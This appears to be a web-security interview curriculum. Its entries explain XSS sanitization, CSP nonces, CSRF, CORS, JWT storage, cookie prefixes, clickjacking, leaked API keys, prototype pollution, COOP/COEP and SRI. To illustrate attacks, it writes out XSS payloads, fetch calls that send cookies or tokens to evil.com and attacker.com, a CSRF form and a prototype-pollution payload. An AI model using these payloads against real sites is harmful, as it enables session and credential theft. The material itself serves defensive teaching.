Never attempt to sanitize HTML using regular expressions (e.g. `str.replace(/<script.*?>.*?<\/script>/gi, '')`). Attackers bypass regex sanitizers effortlessly using obfuscation: `<scr<script>ipt>alert(1)</script>`, `<img src=x onerror=alert(1)>`, or `<svg/onload=alert(1)>`.

## Why

DOMPurify and Trusted Types parse markup through a real DOM tree to strip dangerous tags and event handlers before insertion.

## Worked Case

Walkthrough scenario: A collaborative documentation tool allows users to write markdown that renders to HTML. An attacker inputs a markdown link: [Click here](javascript:fetch('https://evil.com?c='+document.cookie)). A naive regex parser converts this to <a href="javascript:...">. DOMPurify inspects the anchor tag, detects the disallowed javascript: URI protocol on href, and strips the href attribute entirely, leaving a safe non-clickable text span.

## Risk

Writing custom regex string replacements to sanitize HTML is trivially bypassed by nested or obfuscated attack payloads.

## Trade-off

DOMPurify adds ~18KB to the client bundle and incurs a small CPU parsing cost on large HTML strings.

## Try This

Sanitize '<img src=x onerror=alert(1)><b>Hello</b>' with DOMPurify and inspect that only '<b>Hello</b>' remains.

## Follow-ups

### What does the CSP directive require-trusted-types-for 'script' enforce?

It blocks direct string assignments to all DOM sinks (innerHTML, script.src), requiring values to be wrapped in a policy-approved TrustedHTML object.

## Citations

- https://github.com/cure53/DOMPurify
- https://web.dev/articles/trusted-types

# How does a Content Security Policy (CSP) mitigate XSS, and how do cryptographic nonces and hashes work in script-src?

<!-- meta
answer_format: conceptual
difficulty: interview
review.status: reviewed
review.reviewer: Technical curriculum review
review.reviewed_at: 2026-10-24
-->

## Answer

**Direct answer:** **Content Security Policy (CSP)** is an HTTP response header that restricts the resources (scripts, styles, images, fonts, frames, network endpoints) that the browser is permitted to load and execute for a given page. CSP serves as a vital defense-in-depth layer: even if an attacker successfully injects a `<script>` tag via an XSS vulnerability, a strict CSP terminates the script before it can run.

Modern strict CSP does away with brittle domain whitelists and relies on **Cryptographic Nonces** or **Hashes**:
1. **Nonce-based CSP:** The backend generates a cryptographically random, base64-encoded nonce (e.g. `nonce-rAnd0m123`) on *every single HTTP response*. Only `<script>` tags that carry the exact matching `nonce` attribute are executed by the browser.
2. **Hash-based CSP:** The CSP header declares the SHA-256 hash of trusted inline scripts (`'sha256-abc...'`). If a script's contents change by even one character, the browser blocks it.

```http
HTTP/1.1 200 OK
Content-Security-Policy: 
    default-src 'self'; 
    script-src 'nonce-rAnd0m123' 'strict-dynamic'; 
    object-src 'none'; 
    base-uri 'none'; 
    frame-ancestors 'none'; 
    report-uri /api/csp-violations;
```

```html
<!-- 1. Legitimate App Script: Executes because nonce matches header -->
<script nonce="rAnd0m123" src="/main.bundle.js"></script>

<!-- 2. Attacker-Injected XSS Script: BLOCKED! Lacks correct per-request nonce -->
<script src="https://evil.com/malware.js"></script>
<!-- Browser Console: Refused to load the script because it violates the Content Security Policy -->
```

**Complexity analysis and mechanics:**
- **`'strict-dynamic'`:** Allows a trusted script (loaded with a valid nonce) to dynamically load downstream scripts via `document.createElement('script')` without needing separate nonces, greatly simplifying modern module bundlers.
- **`report-uri` / `report-to`:** Sends JSON telemetry reports to the server whenever a policy violation is detected.

**Algorithmic mechanics and edge cases:**
Never reuse static nonces across multiple HTTP requests. If a nonce is static, an attacker simply inspects the page source and injects `<script nonce="STATIC_VALUE">`, completely bypassing the CSP.

## Why

A strict nonce-based CSP terminates unauthorized injected scripts before execution, preventing XSS even if injection occurs.

## Worked Case

Walkthrough scenario: An attacker exploits a query parameter vulnerability to inject <script src="https://hacker.com/keylogger.js"></script>. The browser receives the HTML alongside header Content-Security-Policy: script-src 'nonce-dGhpcy1pcy1hLXJhbmRvbQ=='. The browser inspects the injected tag, detects the missing nonce, and blocks keylogger.js from downloading, logging a CSP violation to the security team and keeping user credentials safe.

## Risk

Reusing a static nonce across requests allows attackers to copy the nonce and bypass CSP script execution blocks.

## Trade-off

Nonce-based CSP requires server-side generation on every page request, making static CDN caching of index.html more complex.

## Try This

Add Content-Security-Policy: script-src 'self' and test executing an inline <script>alert(1)</script> to observe the browser block.

## Follow-ups

### What does the 'strict-dynamic' keyword in a script-src directive achieve?

It allows a trusted root script loaded with a valid nonce to dynamically load downstream scripts without needing to declare all third-party domains in the header.

## Citations

- https://web.dev/articles/strict-csp
- https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP

# How does Cross-Site Request Forgery (CSRF) occur, and how do SameSite cookies and anti-CSRF tokens defend against it?

<!-- meta
answer_format: conceptual
difficulty: interview
review.status: reviewed
review.reviewer: Technical curriculum review
review.reviewed_at: 2026-10-24
-->

## Answer

**Direct answer:** **Cross-Site Request Forgery (CSRF)** is an attack that forces an authenticated user's browser to execute unwanted, state-changing actions on a trusted web application. Because browsers historically attached all stored cookies to every outgoing HTTP request to a target domain—even if the request originated from an external third-party website—an attacker's site could submit a hidden form to `bank.com/transfer` and the browser would automatically include the victim's session cookie.

Two primary defenses eliminate CSRF:
1. **`SameSite` Cookie Attribute (First Line of Defense):**
   - `SameSite=Strict`: Cookies are *never* sent on cross-site requests, even when clicking an external link to the site.
   - `SameSite=Lax` (Default in modern browsers): Cookies are withheld on cross-site subrequests (`<img>`, `fetch`, `POST` forms), but sent on top-level safe GET navigations (clicking a link).
2. **Anti-CSRF Synchronization Tokens (Defense-in-Depth):** The server generates a cryptographically random, unpredictable token tied to the user's session. The frontend includes this token in a custom header (e.g. `X-CSRF-Token`) or hidden form input on state-changing requests (`POST`, `PUT`, `DELETE`). Because the Same-Origin Policy prevents external sites from reading this token, forged requests cannot provide it.

```http
Set-Cookie: session_id=xyz987; Path=/; Secure; HttpOnly; SameSite=Lax
```

```typescript
// Client API Request with Anti-CSRF Token:
export async function postWithCsrf(url: string, data: any) {
    const csrfToken = document.querySelector('meta[name="csrf-token"]')?.getAttribute('content');
    return fetch(url, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
            'X-CSRF-Token': csrfToken || '' // SOP prevents attacker from reading this!
        },
        body: JSON.stringify(data)
    });
}
```

**Complexity analysis and mechanics:**
- **Preflight protection:** Custom headers (`X-CSRF-Token`) trigger a CORS preflight `OPTIONS` check, which cross-origin attackers cannot bypass without server CORS approval.
- **Double-Submit Cookie:** An alternative stateless CSRF pattern where the server sets a random value in a readable cookie, and the client reads it and echoes it back in an HTTP header; the server verifies both match.

**Algorithmic mechanics and edge cases:**
GET requests must *never* execute state-changing actions (like deleting records or transferring funds). If an action can be triggered via a GET request, `SameSite=Lax` cannot protect it because clicking a link transmits Lax cookies.

## Why

SameSite=Lax and anti-CSRF headers prevent malicious third-party websites from forging authenticated state mutations.

## Worked Case

Walkthrough scenario: An attacker creates evil.com with an auto-submitting form: <form action="https://bank.com/transfer" method="POST"><input name="to" value="attacker"><input name="amount" value="1000"></form>. A logged-in bank customer visits evil.com. Because bank.com configured Set-Cookie: session=...; SameSite=Lax, the browser detects a cross-site POST subrequest and withholds the session cookie. The bank server receives an unauthenticated request and rejects the transfer with 401 Unauthorized.

## Risk

Performing state-changing actions via HTTP GET requests bypasses SameSite=Lax protection entirely.

## Trade-off

SameSite=Strict prevents session cookies when users click external email links, requiring users to log in again on new tabs.

## Try This

Inspect Set-Cookie headers in your browser DevTools Application panel and verify that SameSite=Lax or Strict is configured.

## Follow-ups

### What is the Double-Submit Cookie pattern for CSRF defense?

A stateless defense where the server sends a random token in a cookie; the client reads the cookie and sends the same token in an HTTP header; the server confirms both match.

## Citations

- https://owasp.org/www-community/attacks/csrf
- https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Set-Cookie#samesitesamesite-value

# How does the Cross-Origin Resource Sharing (CORS) preflight handshake work, and why does CORS not replace authentication?

<!-- meta
answer_format: conceptual
difficulty: interview
review.status: reviewed
review.reviewer: Technical curriculum review
review.reviewed_at: 2026-10-24
-->

## Answer

**Direct answer:** **CORS (Cross-Origin Resource Sharing)** is a browser security mechanism that relaxes the Same-Origin Policy, allowing a web page on one origin (`https://app.com`) to request data from an API on a different origin (`https://api.com`). Crucially, **CORS is NOT an authentication or authorization mechanism**; it is a mechanism by which the API server tells the *browser* whether the browser is allowed to share the response with client-side JavaScript. Non-browser clients (cURL, Postman, Python scripts) completely ignore CORS headers.

For requests that could alter server data (anything beyond a 'Simple Request'), the browser automatically dispatches an HTTP **`OPTIONS` Preflight Handshake** before sending the actual request:

```http
// 1. Browser sends OPTIONS Preflight Handshake:
OPTIONS /api/users/42 HTTP/1.1
Host: api.com
Origin: https://app.com
Access-Control-Request-Method: PUT
Access-Control-Request-Headers: Authorization, Content-Type

// 2. Server responds approving the preflight:
HTTP/1.1 204 No Content
Access-Control-Allow-Origin: https://app.com
Access-Control-Allow-Methods: GET, POST, PUT, DELETE
Access-Control-Allow-Headers: Authorization, Content-Type
Access-Control-Allow-Credentials: true
Access-Control-Max-Age: 86400  <!-- Cache preflight for 24 hours -->

// 3. Browser now sends the actual PUT request!
```

**Complexity analysis and mechanics:**
- **Simple Request criteria:** `GET`, `HEAD`, `POST` with standard headers (`Accept`, `Content-Type: application/x-www-form-urlencoded`, `multipart/form-data`, `text/plain`). Any request sending `application/json` or `Authorization` headers triggers a preflight.
- **Credentials restriction:** If `Access-Control-Allow-Credentials: true` is set, `Access-Control-Allow-Origin` **cannot be a wildcard `*`**; it must match the explicit requesting origin.

**Algorithmic mechanics and edge cases:**
Preflight requests add an extra network roundtrip latency (100–300ms) to every API call. Adding `Access-Control-Max-Age: 86400` instructs the browser to cache the preflight result, eliminating preflight roundtrips for subsequent requests.

## Why

CORS preflight allows servers to vet custom methods and headers before potentially destructive mutations are dispatched.

## Worked Case

Walkthrough scenario: An application on https://app.com issues a PUT request with Content-Type: application/json to https://api.com. The browser holds the PUT request and dispatches an OPTIONS request. The server responds with Access-Control-Allow-Origin: https://app.com, Allow-Methods: PUT, and Max-Age: 86400. The browser verifies the response, proceeds with the PUT request, and caches the approval for 24 hours.

## Risk

Assuming CORS protects backend APIs from unauthorized access; backend routes still require full JWT/session authentication.

## Trade-off

Uncached CORS preflights add significant network latency before actual requests can begin.

## Try This

Inspect Network panel in DevTools when sending a POST with Content-Type: application/json to a cross-origin API to observe the OPTIONS call.

## Follow-ups

### Can a server return Access-Control-Allow-Origin: * when Access-Control-Allow-Credentials: true is set?

No, browsers reject credentialed requests that use wildcard origins, throwing a CORS error to prevent malicious cross-origin credential harvesting.

## Citations

- https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS
- https://fetch.spec.whatwg.org/#http-cors-protocol

# Where should authentication tokens (JWTs) be stored in the browser: localStorage, sessionStorage, or HttpOnly cookies?

<!-- meta
answer_format: conceptual
difficulty: interview
review.status: reviewed
review.reviewer: Technical curriculum review
review.reviewed_at: 2026-10-24
-->

## Answer

**Direct answer:** Storing authentication tokens involves a direct security trade-off between **Cross-Site Scripting (XSS)** and **Cross-Site Request Forgery (CSRF)**:
1. **`localStorage` (Vulnerable to XSS, Immune to CSRF):** Tokens stored in `localStorage` are accessible by *any JavaScript running on the page*. If an XSS vulnerability exists (in your code or a compromised third-party npm package/analytics script), the attacker can execute `localStorage.getItem('token')` and permanently exfiltrate the user's credential.
2. **`HttpOnly; Secure; SameSite=Lax` Cookie (Industry Gold Standard):** `HttpOnly` completely blocks client-side JavaScript from reading the cookie (`document.cookie` cannot see it), completely neutralizing token theft via XSS. CSRF risks are neutralized by configuring `SameSite=Lax` or `SameSite=Strict` and enforcing anti-CSRF headers.
3. **In-Memory Closure with Silent Refresh (Backend-for-Frontend / BFF):** Keeps the access token in private JavaScript memory (erased on refresh) while a secure `HttpOnly` refresh cookie retrieves new access tokens.

```typescript
// Comparison of Token Storage Models:
// 1. IN-MEMORY (Most secure for Single-Page Apps without full SSR):
let inMemoryAccessToken: string | null = null;
export const getAccessToken = () => inMemoryAccessToken;
export const setAccessToken = (token: string | null) => { inMemoryAccessToken = token; };

// 2. HTTP-ONLY COOKIE CONFIGURATION (Set by Server on Login):
// Set-Cookie: access_token=eyJhbGci...; Path=/; Secure; HttpOnly; SameSite=Lax; Max-Age=900
```

**Complexity analysis and mechanics:**
- **XSS Blast Radius:** With `localStorage`, XSS allows the attacker to steal the token and use it from anywhere in the world until it expires. With `HttpOnly`, XSS allows the attacker to perform actions *only while the user has the tab open*, but cannot steal the token itself.
- **Native mobile exception:** Mobile apps (React Native) lack cookies and browsers; storing tokens in encrypted native keystores (Keychain / Keystore) is standard.

**Algorithmic mechanics and edge cases:**
Modern enterprise security guidelines (OWASP and IETF OAuth 2.0 BCP) explicitly advise **against** storing tokens in `localStorage` for sensitive enterprise applications.

## Why

HttpOnly cookies prevent client-side JavaScript execution from extracting and exfiltrating authentication credentials.

## Worked Case

Walkthrough scenario: An attacker exploits a vulnerability in a third-party analytics script to execute arbitrary JavaScript on an app. The attacker's script executes fetch('https://attacker.com?token=' + localStorage.getItem('jwt')). If the JWT is in localStorage, the attacker captures the token and logs in from another country. If the token is stored in an HttpOnly cookie, localStorage returns null, document.cookie returns empty string, and token exfiltration fails.

## Risk

Storing JWTs in localStorage allows any successful XSS injection to steal tokens and impersonate users indefinitely.

## Trade-off

HttpOnly cookies require server-side cookie configuration and CSRF protection compared to simple localStorage.setItem().

## Try This

Attempt to read an HttpOnly cookie using document.cookie in the browser console and observe that it is invisible.

## Follow-ups

### Can an XSS attacker still perform unauthorized actions if tokens are stored in HttpOnly cookies?

Yes, through XSS the attacker can issue fetch() calls from within the victim's active tab (which auto-attaches cookies), but they cannot extract the token to use elsewhere.

## Citations

- https://cheatsheetseries.owasp.org/cheatsheets/HTML5_Security_Cheat_Sheet.html#local-storage
- https://datatracker.ietf.org/doc/html/draft-ietf-oauth-browser-based-apps

# What do the Secure, HttpOnly, and SameSite cookie attributes enforce, and what do __Host- and __Secure- prefixes guarantee?

<!-- meta
answer_format: conceptual
difficulty: interview
review.status: reviewed
review.reviewer: Technical curriculum review
review.reviewed_at: 2026-10-24
-->

## Answer

**Direct answer:** Hardening session cookies requires configuring four critical attributes and modern prefix guarantees:
1. **`Secure`:** Guarantees the cookie is *only* transmitted over encrypted HTTPS connections, preventing plaintext transmission over HTTP.
2. **`HttpOnly`:** Prohibits client-side scripts from reading the cookie via `document.cookie`, preventing credential theft via XSS.
3. **`SameSite=Lax` / `Strict`:** Restricts cross-site cookie transmission to defend against Cross-Site Request Forgery (CSRF).
4. **Cookie Name Prefixes (`__Host-` and `__Secure-`):** Browsers enforce strict security invariants on cookies whose names begin with these prefixes:
   - `__Secure-`: Must be set with the `Secure` flag over HTTPS.
   - `__Host-` (Maximum Security): Must be set with `Secure`, must have `Path=/`, and **must NOT specify a `Domain` attribute** (restricting the cookie strictly to the current origin and preventing subdomains from overwriting or reading it).

```http
HTTP/1.1 200 OK
Set-Cookie: __Host-session=s8f3k291d; Path=/; Secure; HttpOnly; SameSite=Lax
```

**Complexity analysis and mechanics:**
- **Subdomain sandbox breakout defense:** Without `__Host-`, an insecure subdomain (`blog.example.com` compromised via WordPress) can set a cookie for `.example.com`, performing a **Cookie Tossing attack** that overwrites the parent domain's authentication cookie.
- **Rejection rule:** If a server attempts to set `Set-Cookie: __Host-id=123; Domain=example.com`, the browser strictly rejects and ignores the cookie.

**Algorithmic mechanics and edge cases:**
Cookie prefixes are evaluated and enforced by the browser client, not the server. If an insecure connection attempts to set a cookie with a prefix, the browser drops the header immediately.

## Why

__Host- prefixes lock cookies to HTTPS, root paths, and the exact origin, defeating subdomain cookie-tossing attacks.

## Worked Case

Walkthrough scenario: An attacker compromises a marketing blog on blog.company.com. The attacker attempts a Cookie Tossing attack: setting a session cookie with Domain=.company.com to hijack users on banking.company.com. Because banking.company.com uses Set-Cookie: __Host-session=..., the browser ignores the subdomain's tossed cookie, preserving the authentic root session.

## Risk

Allowing cookies to be scoped to parent domains (Domain=.example.com) allows compromised subdomains to hijack parent user sessions.

## Trade-off

__Host- cookies cannot be shared across subdomains; multi-subdomain architectures must use separate SSO redirect flows.

## Try This

Attempt to set a cookie named __Host-test without the Secure attribute and verify that the browser refuses to store it.

## Follow-ups

### What requirements must be met for a browser to accept a cookie with the __Host- prefix?

It must have the Secure flag, must be delivered over HTTPS, must have Path=/, and must NOT contain a Domain attribute.

## Citations

- https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies#cookie_prefixes
- https://datatracker.ietf.org/doc/html/draft-ietf-httpbis-rfc6265bis#section-5.4

# How does Clickjacking work, and how do X-Frame-Options and CSP frame-ancestors prevent UI redressing?

<!-- meta
answer_format: conceptual
difficulty: interview
review.status: reviewed
review.reviewer: Technical curriculum review
review.reviewed_at: 2026-10-24
-->

## Answer

**Direct answer:** **Clickjacking** (User Interface Redressing) occurs when an attacker renders a target website inside a completely transparent `<iframe>` (`opacity: 0`) and aligns an actionable target button (e.g., 'Delete Account' or 'Confirm 1-Click Purchase') directly beneath an innocent visible decoy button (e.g., 'Play Game' or 'Close Advertisement') on the attacker's page. When the victim clicks the decoy, their click passes into the transparent iframe, triggering the action with their active session.

To prevent framing, applications configure HTTP response headers:
1. **`Content-Security-Policy: frame-ancestors 'none';` (Preferred):** Instructs browsers to reject all attempts by any site to embed the page in `<frame>`, `<iframe>`, `<embed>`, or `<object>`.
2. **`Content-Security-Policy: frame-ancestors 'self' https://partner.com;`:** Allows only the application itself and trusted partner domains to frame the application.
3. **`X-Frame-Options: DENY` (Legacy):** Traditional header supported by older browsers to block all framing.

```http
HTTP/1.1 200 OK
Content-Security-Policy: frame-ancestors 'none';
X-Frame-Options: DENY
```

**Complexity analysis and mechanics:**
- **Enforcement:** Enforced at the browser layout and rendering engine before iframe pixels are composited.
- **Why JS framebusting fails:** Early developers attempted framebusting via `if (top !== self) top.location = self.location;`. Attackers neutralize this by embedding the iframe with `<iframe sandbox="allow-scripts">`, which prevents the iframe from navigating the top window while running scripts.

**Algorithmic mechanics and edge cases:**
If your product is designed to be embedded (e.g., a customer service chat widget), set `frame-ancestors https://*.customer.com;` rather than `'none'`, or serve the embeddable widget on a dedicated, isolated sub-route with its own distinct CSP.

## Why

frame-ancestors blocks framing at the browser engine level, completely neutralizing transparent UI redressing attacks.

## Worked Case

Walkthrough scenario: An attacker creates a video streaming clone with a fake 'Unmute' button. Beneath the button, the attacker embeds social-network.com/settings/deactivate inside an invisible iframe. A user clicks 'Unmute', accidentally triggering account deactivation. Deploying Content-Security-Policy: frame-ancestors 'none' forces the browser to block the iframe rendering, saving user accounts.

## Risk

Relying on JavaScript framebusting code allows sandboxed iframes to disable top navigation and execute clickjacking anyway.

## Trade-off

frame-ancestors 'none' prevents legitimate framing; embeddable widgets must specify explicit partner allowlists.

## Try This

Embed a site with frame-ancestors 'none' inside a local iframe and observe the browser refusing to render the frame.

## Follow-ups

### Why does CSP frame-ancestors take precedence over X-Frame-Options in modern browsers?

CSP frame-ancestors is the modern W3C standard that supports multiple domain allowlists, whereas X-Frame-Options only supported DENY or SAMEORIGIN.

## Citations

- https://owasp.org/www-community/attacks/Clickjacking
- https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/frame-ancestors

# Why must API keys and backend secrets never be bundled into client-side code, and how should client requests be authenticated?

<!-- meta
answer_format: conceptual
difficulty: interview
review.status: reviewed
review.reviewer: Technical curriculum review
review.reviewed_at: 2026-10-24
-->

## Answer

**Direct answer:** In frontend single-page applications, **all bundled code, environment variables, and source maps are completely public**. Prefixing variables with `VITE_`, `REACT_APP_`, or `NEXT_PUBLIC_` inlines those strings into the plaintext JavaScript bundle downloaded by any user on the internet. Private API secrets (OpenAI API keys, Stripe secret keys, database passwords, AWS credentials) bundled into frontend code can be extracted in seconds using browser DevTools or `strings bundle.js`.

The architectural solution is the **Backend-for-Frontend (BFF)** pattern:
1. **Never expose secrets to the client:** The secret key is stored *only* in secure server environment variables (Node.js, Next.js API route, Cloudflare Worker).
2. **Proxy requests through your own backend:** The client sends an authenticated session request (`/api/ai-chat`) to your backend.
3. **Server-side rate limiting and key injection:** Your backend validates the user's session, enforces rate limits, attaches the secret `OPENAI_API_KEY`, and forwards the request to the third-party service.

```typescript
// 1. INSECURE CLIENT-SIDE CODE (CRITICAL VULNERABILITY):
// const openai = new OpenAI({ apiKey: import.meta.env.VITE_OPENAI_KEY }); // LEAKS KEY TO ENTIRE INTERNET!

// 2. SECURE BFF ARCHITECTURE (Next.js API route / Express):
// app/api/chat/route.ts (Runs exclusively on the server)
import { NextRequest, NextResponse } from 'next/server';

export async function POST(req: NextRequest) {
    const session = await getAuthSession(req); // Verify user authentication!
    if (!session) return NextResponse.json({ error: 'Unauthorized' }, { status: 401 });

    const { prompt } = await req.json();
    // Secret key accessed securely on server only:
    const response = await fetch('https://api.openai.com/v1/chat/completions', {
        headers: { 'Authorization': `Bearer ${process.env.OPENAI_SECRET_KEY}` },
        body: JSON.stringify({ model: 'gpt-4o', messages: [{ role: 'user', content: prompt }] })
    });
    return NextResponse.json(await response.json());
}
```

**Complexity analysis and mechanics:**
- **Cost control:** A leaked OpenAI or AWS key can be scraped by automated bots within 5 minutes of hitting GitHub or web bundles, running up thousands of dollars in unauthorized compute.
- **Rate limiting:** The BFF pattern allows enforcing user-level quotas (e.g. 10 queries per day per user) that third-party APIs cannot enforce on raw client keys.

**Algorithmic mechanics and edge cases:**
Public client keys (like Stripe Publishable Key `pk_live_...` or Firebase Client Config) are designed to be public because they only grant tokenization permissions; secret keys (`sk_live_...`) must never appear in client bundles.

## Why

BFF proxies prevent secret API key theft, enforce user rate limits, and protect backend services from billing exploitation.

## Worked Case

Walkthrough scenario: A startup inlines an OpenAI key into a React app via process.env.REACT_APP_OPENAI_KEY. Within 2 hours of deployment, an automated scraper scans the production JavaScript bundle, extracts the key, and generates \$15,000 in GPU completions on unauthorized accounts. Migrating to a BFF Next.js API route keeps the secret strictly on the server, stopping the leakage.

## Risk

Inlining secret API keys into client bundles allows automated bots to scrape keys and incur tens of thousands of dollars in charges.

## Trade-off

Requires maintaining a server or serverless proxy layer rather than calling third-party APIs directly from the browser.

## Try This

Run grep -rn 'API_KEY' on your production dist/ directory to audit for accidentally leaked environment secrets.

## Follow-ups

### Are public client keys (like Stripe pk_test or Firebase client config) safe to include in frontend code?

Yes, public keys are designed for identification and tokenization only; they do not permit administrative mutations or secret data reads.

## Citations

- https://owasp.org/www-community/vulnerabilities/Improper_Handling_of_Secrets
- https://microsoft.github.io/code-with-engineering-playbook/design/design-patterns/backend-for-frontend/

# What is Prototype Pollution in JavaScript, and how do you prevent object prototype manipulation in deep merge utilities?

<!-- meta
answer_format: conceptual
difficulty: interview
review.status: reviewed
review.reviewer: Technical curriculum review
review.reviewed_at: 2026-10-24
-->

## Answer

**Direct answer:** **Prototype Pollution** is a vulnerability unique to JavaScript where an attacker manipulates the fundamental `Object.prototype` object, injecting or modifying properties that are automatically inherited by *every single object* created in the entire application runtime. It typically occurs when flawed recursive deep-merge, object-assign, or query-string parsing functions traverse properties without filtering magic properties like `__proto__`, `constructor`, or `prototype`.

```typescript
// VULNERABLE DEEP MERGE IMPLEMENTATION:
function vulnerableMerge(target: any, source: any) {
    for (const key in source) {
        if (typeof source[key] === 'object' && source[key] !== null) {
            if (!target[key]) target[key] = {};
            vulnerableMerge(target[key], source[key]);
        } else {
            target[key] = source[key];
        }
    }
    return target;
}

// EXPLOIT PAYLOAD: Malicious JSON input
const maliciousJSON = '{"__proto__": {"isAdmin": true}}';
vulnerableMerge({}, JSON.parse(maliciousJSON));

// RESULT: Prototype polluted across the entire runtime!
const normalUser: any = {};
console.log(normalUser.isAdmin); // Prints true! Every object now inherits isAdmin!

// SECURE IMPLEMENTATION:
function safeMerge(target: any, source: any) {
    for (const key of Object.keys(source)) {
        // BLOCK MAGIC PROTOTYPE KEYS:
        if (key === '__proto__' || key === 'constructor' || key === 'prototype') {
            continue;
        }
        if (typeof source[key] === 'object' && source[key] !== null) {
            if (!target[key]) target[key] = {};
            safeMerge(target[key], source[key]);
        } else {
            target[key] = source[key];
        }
    }
    return target;
}
```

**Complexity analysis and mechanics:**
- **Runtime blast radius:** Mutating `Object.prototype` corrupts property lookups across third-party libraries, Express middleware, and React components.
- **Defenses:** 1. Block `__proto__`, `constructor`, `prototype`. 2. Use `Object.create(null)` for prototype-less dictionary lookups. 3. Use `Map` instead of raw plain objects.

**Algorithmic mechanics and edge cases:**
`Object.freeze(Object.prototype)` can be called on application startup to freeze the root prototype object, making prototype pollution impossible across the entire JavaScript runtime.

## Why

Sanitizing recursive merge keys prevents attackers from modifying Object.prototype to bypass authentication logic.

## Worked Case

Walkthrough scenario: An application parses URL query parameters using a naive deep-assignment loop: params[key] = val. An attacker sends a link with ?__proto__[isAdmin]=true. The query parser assigns to target.__proto__.isAdmin, setting the property on Object.prototype. Later, an authorization check: if (user.isAdmin) evaluates to true for an unauthenticated guest user, granting full admin panel access. Filtering __proto__ blocks the injection.

## Risk

Polluting Object.prototype alters default property lookups across all objects in memory, enabling privilege escalation.

## Trade-off

Object.freeze(Object.prototype) eliminates prototype pollution but can break poorly written third-party libraries that polyfill methods.

## Try This

Run the vulnerableMerge snippet in the browser console and observe how {} suddenly inherits isAdmin=true.

## Follow-ups

### How do prototype-less objects created via Object.create(null) prevent prototype pollution?

Objects created with Object.create(null) have no prototype chain (no __proto__ or Object methods), making prototype injection impossible.

## Citations

- https://owasp.org/www-community/attacks/Prototype_Pollution
- https://portswigger.net/web-security/prototype-pollution

# How does Cross-Origin Opener Policy (COOP) and Cross-Origin Embedder Policy (COEP) isolate browser process memory?

<!-- meta
answer_format: conceptual
difficulty: interview
review.status: reviewed
review.reviewer: Technical curriculum review
review.reviewed_at: 2026-10-24
-->

## Answer

**Direct answer:** In modern operating systems and web browsers, multiple browsing contexts (tabs and windows) opened by links can share the same operating system process thread. The Spectre and Meltdown hardware CPU vulnerabilities proved that malicious code running in one origin can use CPU speculative execution and microarchitectural cache timing attacks to read secret memory (passwords, credit cards, keys) belonging to other origins hosted in that same process.

To enforce **Process Isolation at the OS level**, web standards introduced two strict response headers that work in tandem:
1. **`Cross-Origin-Opener-Policy: same-origin` (COOP):** Forces the browser to put the page into a completely separate browsing context group and OS process, severing all `window.opener` pointers to cross-origin windows.
2. **`Cross-Origin-Embedder-Policy: require-corp` (COEP):** Prohibits the page from loading *any* cross-origin subresource (image, script, stylesheet, iframe) unless the resource explicitly responds with a `Cross-Origin-Resource-Policy: cross-origin` header.

```http
HTTP/1.1 200 OK
Cross-Origin-Opener-Policy: same-origin
Cross-Origin-Embedder-Policy: require-corp
```

**Complexity analysis and mechanics:**
- **`window.crossOriginIsolated`:** When both headers are active, the browser sets `window.crossOriginIsolated = true`.
- **Unlocked capabilities:** Only when cross-origin isolated will modern browsers permit the creation of `SharedArrayBuffer` and high-resolution `performance.now()` timers without artificial jitter.

**Algorithmic mechanics and edge cases:**
Deploying COEP can break third-party ad networks, social widgets, and CDN images that do not serve CORP headers. Use `Cross-Origin-Embedder-Policy-Report-Only` initially to monitor which subresources would be blocked before enforcing production rules.

## Why

COOP and COEP enforce OS-level process isolation, neutralizing Spectre-style cache-timing memory extraction attacks.

## Worked Case

Walkthrough scenario: A web-based audio workstation needs SharedArrayBuffer for real-time multi-threaded audio synthesis. Without COOP and COEP, creating new SharedArrayBuffer(1024) throws a ReferenceError. The backend adds Cross-Origin-Opener-Policy: same-origin and Cross-Origin-Embedder-Policy: require-corp. The browser isolates the process, window.crossOriginIsolated evaluates to true, and multi-threaded audio processing runs with zero microarchitectural memory leakage.

## Risk

Enabling COEP without auditing external dependencies immediately blocks third-party images, fonts, and scripts that lack CORP headers.

## Trade-off

Unlocks multi-threaded WebAssembly and SharedArrayBuffer at the cost of strict subresource policy enforcement.

## Try This

Inspect window.crossOriginIsolated in DevTools and verify that SharedArrayBuffer constructor throws without COOP/COEP headers.

## Follow-ups

### Why did browsers originally disable SharedArrayBuffer after the Spectre vulnerability was published?

SharedArrayBuffer enabled creating microsecond-precision timers across worker threads that could measure CPU cache timing differences to leak memory.

## Citations

- https://web.dev/articles/coop-coep
- https://developer.mozilla.org/en-US/docs/Web/API/Window/crossOriginIsolated

# How do you secure third-party script integrations (analytics, tag managers) using Subresource Integrity (SRI) and CSP?

<!-- meta
answer_format: conceptual
difficulty: interview
review.status: reviewed
review.reviewer: Technical curriculum review
review.reviewed_at: 2026-10-24
-->

## Answer

**Direct answer:** Modern web applications frequently include third-party scripts from external CDNs (e.g. Google Tag Manager, analytics, payment SDKs, polyfills). If an external CDN is compromised or an attacker performs a DNS hijacking attack, the CDN can serve modified, malicious JavaScript directly to your users—a catastrophic supply-chain attack (e.g. Magecart attacks stealing credit cards). Frontends defend against this using **Subresource Integrity (SRI)** paired with strict Content Security Policies:

1. **Subresource Integrity (SRI):** Appends an `integrity` attribute containing the base64-encoded cryptographic hash (SHA-256, SHA-384, or SHA-512) of the expected script file. Before executing the script, the browser hashes the downloaded bytes; if a single character was altered, the browser terminates the script immediately.
2. **`crossorigin="anonymous"`:** Mandatory on SRI tags so the browser can read the byte hash without CORS privacy restrictions.

```html
<!-- Secure Third-Party Script with Subresource Integrity (SRI) -->
<script
    src="https://cdn.example.com/analytics.v2.js"
    integrity="sha384-oqVuAfXRKap7fdgcCY5uykM6+R9GqQ8K/uxy9rx7HNQlGYl1kPzQho1wx4JwY8wC"
    crossorigin="anonymous"
></script>
```

**Complexity analysis and mechanics:**
- **Hash verification:** Executed in the browser's C++ network parser before JavaScript compilation begins.
- **Magecart defense:** Even if an attacker compromises the CDN file server and injects a credit card skimmer, the hash fails and the browser drops the file.

**Algorithmic mechanics and edge cases:**
SRI cannot be used for dynamic scripts that frequently change content on the fly without versioned URLs (e.g. Google Tag Manager containers that update via web UI). For unversioned dynamic scripts, isolate them inside a sandboxed iframe or configure strict CSP `connect-src` to prevent unauthorized exfiltration endpoints.

## Why

